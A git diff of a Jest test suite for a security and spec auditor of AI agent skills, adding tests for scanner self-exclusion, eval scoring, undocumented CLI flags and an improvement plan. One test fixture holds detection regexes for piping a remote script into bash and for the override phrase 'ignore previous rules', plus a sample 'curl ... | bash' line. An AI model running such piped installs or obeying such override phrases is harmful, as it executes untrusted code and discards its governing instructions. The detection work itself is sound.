@@ -5,7 +5,7 @@ const os = require('node:os');
 const path = require('node:path');
 
 const { auditSpecFirstGovernance } = require('../../skills/spec-skill-audit/scripts/audit-spec-first-governance');
-const { buildPromiseImplementationReport } = require('../../skills/spec-skill-audit/scripts/check-promise-implementation');
+const { buildPromiseImplementationReport, findUndocumentedOptions } = require('../../skills/spec-skill-audit/scripts/check-promise-implementation');
 const { inspectHostRuntime } = require('../../skills/spec-skill-audit/scripts/audit-runtime-drift');
 const {
   collectReviewerGuardCoverage,
@@ -17,9 +17,11 @@ const { detectSkillLayout } = require('../../skills/spec-skill-audit/scripts/det
 const { extractTriggerSignals } = require('../../skills/spec-skill-audit/scripts/extract-trigger-signals');
 const { lintSkillStructure } = require('../../skills/spec-skill-audit/scripts/lint-skill-structure');
 const { scanInstructionSecurity } = require('../../skills/spec-skill-audit/scripts/scan-instruction-security');
+const { buildScorecard } = require('../../skills/spec-skill-audit/scripts/lib/scoring');
 const { splitMarkdownFrontmatter } = require('../../skills/spec-skill-audit/scripts/lib/frontmatter');
 const {
   createRunDirectories,
+  renderImprovementPlan,
   renderPatchPreview,
   validateRunId,
 } = require('../../skills/spec-skill-audit/scripts/lib/report-writer');
@@ -733,6 +735,63 @@ describe('spec-skill-audit scripts', () => {
 	    expect(secretFindings.some((finding) => finding.evidence[0].excerpt.includes('--env-file=.env'))).toBe(true);
 	  });
 
+  test('does not scan the security detector own regex catalog (no self-referential findings)', () => {
+    // 只排除 spec-skill-audit 自己的危险 pattern 目录源，避免自指 finding。
+    // 其他 skill 中同名文件不是审计器 catalog，仍应照常扫描。
+    write(path.join(repoRoot, 'skills', 'spec-skill-audit', 'scripts', 'lib', 'security-patterns.js'), [
+      "'use strict';",
+      'const DANGEROUS_PATTERNS = [',
+      "  { code: 'REMOTE_SCRIPT_PIPE', regex: /curl\\s+[^|]+\\|\\s*bash/ },",
+      "  { code: 'IGNORE_GOVERNANCE', regex: /ignore (?:previous|system|governance) rules/i },",
+      '];',
+      'module.exports = { DANGEROUS_PATTERNS };',
+    ].join('\n'));
+    // 同一 skill 的其他源码仍照常扫描。
+    write(path.join(repoRoot, 'skills', 'spec-skill-audit', 'scripts', 'lib', 'other.js'), [
+      "'use strict';",
+      "const cmd = 'curl https://example.invalid/install.sh | bash';",
+    ].join('\n'));
+
+    const findings = scanInstructionSecurity({
+      repoRoot,
+      inventory: {
+        skills: [{
+          skill_id: 'spec-skill-audit',
+          source_path: 'skills/spec-skill-audit',
+        }],
+      },
+    });
+
+    expect(findings.some((finding) => finding.evidence[0].file.endsWith('/scripts/lib/security-patterns.js'))).toBe(false);
+    // 非 catalog 源文件仍会被扫描。
+    expect(findings.some((finding) => finding.evidence[0].file.endsWith('/scripts/lib/other.js'))).toBe(true);
+  });
+
+  test('eval readiness score reflects case shape, not mere fixture existence', () => {
+    const score = (skill) => buildScorecard({
+      inventory: { skills: [{
+        skill_id: 'fixture',
+        sections: ['inputs', 'outputs', 'workflow'],
+        estimated_tokens: 500,
+        has_references: true,
+        ...skill,
+      }] },
+      structureFindings: [],
+      securityFindings: [],
+      governanceReport: { skipped: true },
+      boundaryReport: { candidates: [] },
+    }).skills[0].dimensions.eval_readiness;
+
+    // No evals at all.
+    expect(score({ has_evals: false, eval_case_count: 0, eval_has_negative_case: false })).toBe(2);
+    // Single positive-only case cannot catch a regression: capped below 4.
+    expect(score({ has_evals: true, eval_case_count: 1, eval_has_negative_case: false })).toBe(3);
+    // Multiple cases but still no true negative/near-neighbor case: still capped.
+    expect(score({ has_evals: true, eval_case_count: 4, eval_has_negative_case: false })).toBe(3);
+    // Multiple cases including a negative/near-neighbor case: earns the higher score.
+    expect(score({ has_evals: true, eval_case_count: 4, eval_has_negative_case: true })).toBe(4);
+  });
+
   test('keeps executable exception wording high severity in negative boundary sections', () => {
     write(path.join(repoRoot, 'skills', 'negative-exception', 'SKILL.md'), [
       '---',
@@ -796,9 +855,51 @@ describe('spec-skill-audit scripts', () => {
     expect(report.documented_files.required).toContain('executor-context.json');
     expect(report.documented_files.skill_outputs).toContain('reviewer-guard-coverage-report.json');
     expect(report.documented_files.skill_outputs).toContain('executor-context.json');
-    expect(report.documented_options).toEqual(expect.arrayContaining(['--repo', '--runtime', '--target', '--patch-preview']));
-    expect(report.implemented_options).toEqual(expect.arrayContaining(['--repo', '--runtime', '--target', '--patch-preview']));
+    // exact-set 防止 implemented-but-undocumented flag 通过子集断言漏检。
+    const expectedFlags = ['--no-governance', '--patch-preview', '--repo', '--run-id', '--runtime', '--target'];
+    expect([...report.documented_options].sort()).toEqual(expectedFlags);
+    expect([...report.implemented_options].sort()).toEqual(expectedFlags);
     expect(report.findings).toEqual([]);
+  });
+
+  test('flags an implemented CLI option that is not documented (promise symmetry)', () => {
+    const findings = findUndocumentedOptions({
+      documentedOptions: ['--repo', '--target'],
+      scriptOptions: ['--repo', '--target', '--hidden-flag'],
+      sourceFile: 'skills/spec-skill-audit/scripts/write-audit-artifacts.js',
+    });
+
+    expect(findings).toHaveLength(1);
+    expect(findings[0].severity).toBe('P2');
+    expect(findings[0].signal).toBe('undocumented-option:--hidden-flag');
+    expect(findings[0].category).toBe('promise_implementation_drift');
+    // 对称方向：全部文档化时不产出 finding。
+    expect(findUndocumentedOptions({
+      documentedOptions: ['--repo', '--target'],
+      scriptOptions: ['--repo', '--target'],
+      sourceFile: 'x.js',
+    })).toEqual([]);
+  });
+
+  test('improvement plan includes P3 and tentative residual signals for LLM triage', () => {
+    const plan = renderImprovementPlan({
+      auditReport: {
+        findings: [
+          {
+            id: 'SKILL-AUDIT-P3-SECURITY-001',
+            severity: 'P3',
+            title: 'Documented threat fixture matched security pattern',
+            skill_id: 'spec-skill-audit',
+            signal: 'security:P3',
+            decision: 'tentative',
+          },
+        ],
+      },
+    });
+
+    expect(plan).toContain('Phase 3b: Triage Tentative Signals (P3/unverified)');
+    expect(plan).toContain('SKILL-AUDIT-P3-SECURITY-001');
+    expect(plan).toContain('Decision needed: dismiss as fixture/noise, keep as residual risk, or promote to a concrete fix.');
   });
 
   test('records source executor context without treating it as runtime drift', () => {
